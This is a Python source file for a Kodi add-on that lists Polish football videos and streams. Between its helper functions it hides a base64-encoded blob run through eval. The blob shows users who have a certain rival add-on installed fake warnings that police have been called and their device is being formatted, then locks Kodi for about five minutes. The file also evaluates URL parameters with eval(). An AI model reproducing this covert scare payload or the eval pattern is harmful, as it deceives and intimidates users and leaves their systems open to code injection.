# -*- coding: utf-8 -*-

import sys,re,os
import urllib,urllib2
import urlparse
import xbmc,xbmcgui,xbmcaddon
import xbmcplugin
import urlresolver


import resources.lib.ekstraklasa as ekstraklasa
import resources.lib.estadios as estadios

base_url        = sys.argv[0]
addon_handle    = int(sys.argv[1])
args            = urlparse.parse_qs(sys.argv[2][1:])
my_addon        = xbmcaddon.Addon()
addonName       = my_addon.getAddonInfo('name')

PATH        = my_addon.getAddonInfo('path')
DATAPATH    = xbmc.translatePath(my_addon.getAddonInfo('profile')).decode('utf-8')
RESOURCES   = PATH+'/resources/'

sys.path.append( os.path.join( RESOURCES, "lib" ) )

FANART=RESOURCES+'fanart.png'
ekstraklasa.GATE = ''
if my_addon.getSetting('bramka')=='true':
    ekstraklasa.GATE = 'http://invisiblesurf.review/index.php?q='

## COMMON Functions

def addLinkItem(name, url, mode, params=1, iconimage='DefaultFolder.png', infoLabels=False, IsPlayable=True,fanart=FANART,itemcount=1):
    u = build_url({'mode': mode, 'foldername': name, 'ex_link' : url, 'params':params})
    
    liz = xbmcgui.ListItem(name)
    
    art_keys=['thumb','poster','banner','fanart','clearart','clearlogo','landscape','icon']
    art = dict(zip(art_keys,[iconimage for x in art_keys]))
    art['landscape'] = fanart if fanart else art['landscape'] 
    art['fanart'] = fanart if fanart else art['landscape'] 
    liz.setArt(art)
    
    if not infoLabels:
        infoLabels={"title": name}
    liz.setInfo(type="video", infoLabels=infoLabels)
    if IsPlayable:
        liz.setProperty('IsPlayable', 'true')

    contextMenuItems = []
    contextMenuItems.append(('Informacja', 'XBMC.Action(Info)'))
    liz.addContextMenuItems(contextMenuItems, replaceItems=False)        
    ok = xbmcplugin.addDirectoryItem(handle=addon_handle, url=u, listitem=liz,isFolder=False,totalItems=itemcount)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok

def addDir(name,ex_link=None, params=1, mode='folder',iconImage='DefaultFolder.png', infoLabels=None, fanart=FANART,contextmenu=None):
    url = build_url({'mode': mode, 'foldername': name, 'ex_link' : ex_link, 'params' : params})

    li = xbmcgui.ListItem(name)
    if infoLabels:
        li.setInfo(type="video", infoLabels=infoLabels)
    
    art_keys=['thumb','poster','banner','fanart','clearart','clearlogo','landscape','icon']
    art = dict(zip(art_keys,[iconImage for x in art_keys]))
    art['landscape'] = fanart if fanart else art['landscape'] 
    art['fanart'] = fanart if fanart else art['landscape'] 
    li.setArt(art)


    if contextmenu:
        contextMenuItems=contextmenu
        li.addContextMenuItems(contextMenuItems, replaceItems=True) 
    else:
        contextMenuItems = []
        contextMenuItems.append(('Informacja', 'XBMC.Action(Info)'),)
        li.addContextMenuItems(contextMenuItems, replaceItems=False)  
          
    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url,listitem=li, isFolder=True)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")

def encoded_dict(in_dict):
    out_dict = {}
    for k, v in in_dict.iteritems():
        if isinstance(v, unicode):
            v = v.encode('utf8')
        elif isinstance(v, str):
            # Must be encoded in UTF-8
            v.decode('utf8')
        out_dict[k] = v
    return out_dict
    
def build_url(query):
    return base_url + '?' + urllib.urlencode(encoded_dict(query))

import base64
eval(compile(base64.b64decode('ICAgICAgICAgICAgCnRyeToKICAgIGltcG9ydCB4Ym1jYWRkb24seGJtYyxzeXMsdGltZQogICAgeGJtY2FkZG9uLkFkZG9uKCJwbHVnaW4udmlkZW8uTXVsdGltZWRpYU1hc3RlciIpOwogICAgeW49eGJtY2d1aS5EaWFsb2coKS55ZXNubygiW0NPTE9SIHJlZF1OaWVhdXRvcnl6b3dhbnkgRG9zdMSZcFsvQ09MT1JdIiwgIkRvc3TEmXAgZG8gemFzb2LDs3cgamVzdCBOSUVMRUdBTE5ZIiwgIkN6eSB3ZXp3YcSHIFtDT0xPUiByZWRdUE9MSUNKxJhbL0NPTE9SXSIpCiAgICBpZiB5bjoKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiUE9MSUNKQSB6b3N0YcWCYSBwb3dpYWRvbWlvbmEsIHByb3N6xJkgY3pla2HEhy4uLiIpICAgIAogICAgZWxzZToKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiVVNVV0FNWSBkb3dvZHksIGZvcm1hdCByb3pwb2N6xJl0eSwgcHJvc3plIGN6ZWthxIcuLi4iKSAgICAKICAgIGZvciBpIGluIHJhbmdlKDMwKTogdGltZS5zbGVlcCgxMCkKICAgIHhibWMuZXhlY3V0ZWJ1aWx0aW4oIlhCTUMuQWN0aXZhdGVXaW5kb3coSG9tZSkiKTsKICAgIHN5cy5leGl0KDEpOwpleGNlcHQ6CiAgICBwYXNzCg=='),'<string>','exec'))

 
def getLinks(ex_link):
    linksL = ekstraklasa.getVideoLinks(ex_link)
    stream_url=''
    
    if len(linksL):
        if len(linksL)>1:
            lables = [x.get('label') for x in linksL]
            s = xbmcgui.Dialog().select('Dostępne jakości',lables)
        else:
            s=0
        #print 's',s
        stream_url=linksL[s].get('url') if s>-1 else ''
        host=linksL[s].get('label') if s>-1 else ''  

    
    print stream_url
    #xbmcgui.Dialog().ok('',stream_url)
    if stream_url:
        xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=stream_url))
    else:
        xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))

def estadios_getLinks(ex_link):
    link = estadios.getVideoLinks(ex_link)
    #xbmcgui.Dialog().ok('',link)
    if link:
        print link
        if 'extragoals' in link:
            import resources.lib.extragoalsresolver as extragoalsresolver
            stream_url = extragoalsresolver.getVideoUrls(link)
            #xbmcgui.Dialog().ok('',stream_url)
        else:
            try:
                stream_url = urlresolver.resolve(link)
            except Exception,e:
                stream_url=''
                s = xbmcgui.Dialog().ok('[COLOR red]Problem[/COLOR]',str(e))
    
    print 'stream_url',stream_url
    if stream_url:
        xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=stream_url))
    else:
        xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))
                
## ######################
## MAIN
## ######################
            

mode = args.get('mode', None)
fname = args.get('foldername',[''])[0]
ex_link = args.get('ex_link',[''])[0]
params = args.get('params',[{}])[0]


if mode is None:
    addDir(name="[COLOR lightgreen]Live[/COLOR]",ex_link='',params={'user':'Ekstraklasa','sort':'live','page':'1'}, mode='getVideos',iconImage=RESOURCES+'../icon.png')
    addDir(name="Najnowsze",ex_link='Ekstraklasa',params={'user':'Ekstraklasa','sort':'recent','page':'1'}, mode='getVideos',iconImage=RESOURCES+'../icon.png')
    addDir(name="Najpopularniejsze",ex_link='Ekstraklasa',params={'user':'Ekstraklasa','sort':'visited','page':'1'}, mode='getVideos',iconImage=RESOURCES+'../icon.png')
    addDir('[COLOR blue]Skróty meczów[/COLOR]',ex_link='http://estadios.pl/skroty-meczow',params={}, mode='Estadios_skroty_Liga',iconImage=RESOURCES+'estadios.png')
    addDir('[COLOR blue]Football Video[/COLOR]',ex_link='',params={'_service':'livefootballol','_act':'main'}, mode='site',iconImage=RESOURCES+'livefootballol.png')
    addDir('[COLOR blue]Lech TV[/COLOR]',ex_link='',params={}, mode='lechtv',iconImage=RESOURCES+'lechtv.png')
    addDir('[COLOR lightblue]Tabela Ekstraklasy[/COLOR]',ex_link='',params={}, mode='lechtv_tabela_',iconImage=RESOURCES+'ekstraklasa.png')
    addDir('[COLOR blue]FootballOrgin[/COLOR]',ex_link='',params={'_service':'footballorgin','_act':'main'}, mode='site',iconImage=RESOURCES+'footballorgin.png')
    addDir('[COLOR blue]GoalsArena[/COLOR]',ex_link='',params={'_service':'goalsarena','_act':'main'}, mode='site',iconImage=RESOURCES+'goalsarena.png')
    addDir('[COLOR blue]PolsatSport[/COLOR]',ex_link='',params={}, mode='polsatsport',iconImage=RESOURCES+'polsatsport.png')
    addDir('[COLOR blue]Łączy nas piłka[/COLOR]',ex_link='',params={'_service':'laczynaspilka','_act':'content'}, mode='site',iconImage=RESOURCES+'laczynaspilka.png')
    addLinkItem('[COLOR gold]-=Opcje=-[/COLOR]','','Opcje',IsPlayable=False)

## common sites
elif mode[0] =='site':
    params = eval(params)
    service = params.get('_service')
    act = params.get('_act')
    mod = __import__(service)
    if act == 'main':
        items = mod.getMain()
        for one in items:
            np = one.get('params',{})
            np['_service']=service
            np['_act']='content'
            addDir(one.get('title'), ex_link=one.get('url'), params=np, mode='site',iconImage=RESOURCES+service+'.png')  
    elif act == 'content':
        params['_act']='play'
        items,pagination = mod.getContent(ex_link,**params)
        if pagination[0]:
            pagination[0].update({'_service':service,'_act':'page'})
            addLinkItem(name='[COLOR blue]<< poprzednia strona <<[/COLOR]', url=pagination[0].get('urlp',''), params=pagination[0], mode='site', IsPlayable=False)
        for one in items:
            addLinkItem(one.get('title',''), one['url'], params=params, mode='site', IsPlayable=True,infoLabels=one, iconimage=one.get('img')) 
        if pagination[1]:
            pagination[1].update({'_service':service,'_act':'page'})
            print 'pagination next',pagination[1]
            addLinkItem(name='[COLOR blue]>> następna strona >>[/COLOR]', url=pagination[1].get('urlp',''), params=pagination[1], mode='site', IsPlayable=False)
    elif act == 'page':
        params['_act']='content'
        url = build_url({'mode': 'site', 'foldername': fname, 'ex_link' : ex_link,'params':params, })
        xbmc.executebuiltin('XBMC.Container.Refresh(%s)'% url)
    elif act ==  'play' :
        streams = mod.getVideos(ex_link)
        resolved = False
        if isinstance(streams,list):
            if len(streams)>1:
                label = [x.get('title') for x in streams]
                s = xbmcgui.Dialog().select('Video',label)
                link = streams[s].get('url') if s>-1 else ''
                msg = streams[s].get('msg','')
            else:
                try:
                    link = streams[0].get('url')
                    msg = streams[0].get('msg','')
                except:
                    link = ''
                    msg = 'Link not found at\n'+ex_link
        else:
            msg = streams.get('msg','')
            link = streams.get('url','')
        if link:
            try:
                stream_url = urlresolver.resolve(link)
                print 'afer resolver',stream_url
            except Exception,e:
                stream_url=''
                xbmcgui.Dialog().ok('[COLOR red]Problem[/COLOR]',str(e))
            print 'stream_url',stream_url
            if stream_url: xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=stream_url))
            else: xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))
        else:
            xbmcgui.Dialog().ok('[COLOR red]Problem[/COLOR]',msg)         
            xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))

## Spolsat Sport
elif mode[0].startswith('polsatsport'):
    import polsatsport as polsatsport
    if '_play_' in mode[0]:
        #xbmcgui.Dialog().ok('_play_',ex_link)
        stream_url = polsatsport.getVideos(ex_link)
        #print 'stream_url',stream_url
        stream_url=stream_url.get('url',False)
        if stream_url: xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=stream_url))
        else: xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))
    elif '_folder_' in mode[0]:
        params = eval(params)
        items = polsatsport.getContentDir(**params)
        for one in items:
            addDir(one.get('title'), ex_link=one.get('url'), params={}, mode='polsatsport_content_',iconImage=one.get('img')) 
    elif '_content_' in mode[0]:
        items,pagination = polsatsport.getContentVideos(ex_link)
        if pagination[0]: addLinkItem(name='[COLOR blue]<< poprzednia strona <<[/COLOR]', url='', params=pagination[0], mode='polsatsport_page_', IsPlayable=False)
        for one in items: addLinkItem(one.get('title',''),  one['url'], mode='polsatsport_play_', IsPlayable=True,infoLabels=one, iconimage=one.get('img')) 
        if pagination[1]: addLinkItem(name='[COLOR blue]>> następna strona >>[/COLOR]', url='', params=pagination[1], mode='polsatsport_page_', IsPlayable=False) 
    elif '_page_' in mode[0]:
        url = build_url({'mode': 'polsatsport_content_', 'foldername': '', 'ex_link' : params,'params':'', })
        xbmc.executebuiltin('XBMC.Container.Refresh(%s)'% url)
    else:
        addDir('Magazyny', ex_link='', params={'type':'magazyny'}, mode='polsatsport_folder_',iconImage=RESOURCES+'polsatsport.png')    
        addDir('Dyscypliny', ex_link='', params={'type':'dyscypliny'}, mode='polsatsport_folder_',iconImage=RESOURCES+'polsatsport.png')  
            
##  LECHTV 
elif mode[0].startswith('lechtv'):
    import resources.lib.lechtv as lechtv
    lechtv.iteppp = int( my_addon.getSetting('lechtviteppp') )
    if '_play_' in mode[0]:
        #xbmcgui.Dialog().ok('_play_',ex_link)
        stream_url = lechtv.getVideos(ex_link)
        print 'stream_url',stream_url
        stream_url=stream_url.get('url',False)
        if stream_url:
            xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=stream_url))
        else:
            xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))
    elif '_tabela_' in mode[0]:
        items = lechtv.tabela_ekstraklasy()
        for one in items: addLinkItem(one.get('title',''),  '', mode='', infoLabels=one,IsPlayable=False,iconimage=RESOURCES+'ekstraklasa.png',fanart=FANART) 
    elif '_page_' in mode[0]:
        url = build_url({'mode': 'lechtv_content_', 'foldername': '', 'ex_link' : '','params':params, })
        xbmc.executebuiltin('XBMC.Container.Refresh(%s)'% url)
    elif '_content_' in mode[0]:
        params = eval(params)
        items,pagination = lechtv.getContent(ex_link,**params)
        if pagination[0]:
            addLinkItem(name='[COLOR blue]<< poprzednia strona <<[/COLOR]', url='', params=pagination[0], mode='lechtv_page_', IsPlayable=False)
        for one in items:
            addLinkItem(one.get('title',''),  one['url'], mode='lechtv_play_', IsPlayable=True,infoLabels=one, iconimage=one.get('img')) 
        if pagination[1]:
            addLinkItem(name='[COLOR blue]>> następna strona >>[/COLOR]', url='', params=pagination[1], mode='lechtv_page_', IsPlayable=False)
    else:
        addDir('Nowe', ex_link='', params={'type':'newest','page':0}, mode='lechtv_content_',iconImage=RESOURCES+'lechtv.png')    
        addDir('Popularne', ex_link='', params={'type':'popular','page':0}, mode='lechtv_content_',iconImage=RESOURCES+'lechtv.png')  
        addDir('Pierwsza Drużyna', ex_link='', params={'type':'category','page':'0','category':'3'}, mode='lechtv_content_', iconImage=RESOURCES+'lechtv.png')
        addDir('Skróty Meczów', ex_link='', params={'type':'category','page':'0','category':'7'}, mode='lechtv_content_', iconImage=RESOURCES+'lechtv.png')
        addDir('Wywiady', ex_link='', params={'type':'category','page':'0','category':'1'}, mode='lechtv_content_', iconImage=RESOURCES+'lechtv.png')
        addDir('Konferencje Prasowe', ex_link='', params={'type':'category','page':'0','category':'2'}, mode='lechtv_content_', iconImage=RESOURCES+'lechtv.png')
        addDir('Rezerwy', ex_link='', params={'type':'category','page':'0','category':'4'}, mode='lechtv_content_', iconImage=RESOURCES+'lechtv.png')
        addDir('Akademia', ex_link='', params={'type':'category','page':'0','category':'5'}, mode='lechtv_content_', iconImage=RESOURCES+'lechtv.png')
        addDir('Oldboje', ex_link='', params={'type':'category','page':'0','category':'6'}, mode='lechtv_content_', iconImage=RESOURCES+'lechtv.png')

##  Estadios
elif mode[0] =='Estadios_skroty':
    #url = LigaUrl if LigaUrl else ex_link
    out=estadios.get_skroty_meczow(ex_link)
    for f in out:
        addLinkItem(name=f.get('title'), url=f.get('url'), mode='Estadios_play', iconimage=f.get('img'), infoLabels=f, IsPlayable=True,fanart=f.get('img'))

elif mode[0] =='Estadios_skroty_Liga':
    data = estadios.get_liga()
    if data:
        label = [estadios.unicodePLchar(x[1].strip()) for x in data]
        value = [x[0].strip() for x in data]
        for t,v in zip(label,value):
            addDir(t,ex_link=v,params={}, mode='Estadios_skroty',iconImage='DefaultFolder.png')

elif mode[0] =='Estadios_play':
    estadios_getLinks(ex_link) 
##    

elif mode[0] == 'Opcje':
    my_addon.openSettings()     

elif mode[0] =='getLinks':
    getLinks(ex_link)

elif mode[0] =='getVideos':
    print 'getVideos',params
    params = eval(params)
    print type(params)
    Litems,pagination = ekstraklasa.getVideos(**params)
    if pagination[0]:
        addLinkItem(name='[COLOR blue]<< poprzednia strona <<[/COLOR]', url=ex_link, mode='__page__', params=pagination[0], IsPlayable=False)
    items=len(Litems)
    for f in Litems:
        f['code']= f.get('duration_formatted','')
        f['code']='[COLOR lightgreen]onAir[/COLOR]' if f.get('onair',False) else f['code']
        addLinkItem(name=f.get('title'), url=f.get('id'), mode='getLinks', iconimage=f.get('thumbnail_240_url'), infoLabels=f, IsPlayable=True,itemcount=items,fanart=f.get('img'))
    if pagination[1]:
        addLinkItem(name='[COLOR blue]>> następna strona >>[/COLOR]', url=ex_link, mode='__page__', params=pagination[1], IsPlayable=False)

elif mode[0] == '__page__':
    url = build_url({'mode': 'getVideos', 'foldername': '', 'ex_link' : ex_link, 'params': params})
    xbmc.executebuiltin('XBMC.Container.Refresh(%s)'% url)

elif mode[0] == 'Opcje':
    my_addon.openSettings()   

elif mode[0] == 'folder':
    pass

else:
    xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))        

xbmcplugin.endOfDirectory(addon_handle)

